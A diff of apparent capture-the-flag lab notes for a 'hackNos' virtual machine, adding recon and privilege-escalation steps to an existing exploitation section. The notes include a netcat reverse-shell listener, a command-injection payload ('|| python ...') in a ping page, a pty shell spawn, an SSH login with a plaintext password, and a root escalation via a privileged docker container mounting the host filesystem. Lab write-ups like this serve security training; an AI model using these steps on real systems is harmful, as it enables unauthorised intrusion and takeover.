@@ -60,7 +60,14 @@
 	- run nc -lvp 4444 to initiate a listener on 4444
 	- on 192.168.0.12/5ecure/index.php ping scan, run '|| python /var/opt/python.py' 
 	- tty: python -c 'import pty; pty.spawn("/bin/bash")'
+	- getent group 
+		* docker:x:119:   # note: passwd --> recon:x:1000:119:rahul:/home/recon:/bin/bash
+		* recon user gid = docker 
 
+3) Escelation
+	- ssh 192.168.0.12 -l recon
+		* pass: Security@hackNos
+	- docker run -it --privileged --name=ctf -v /:/host:rw alpine sh
 
 
 !) Files:
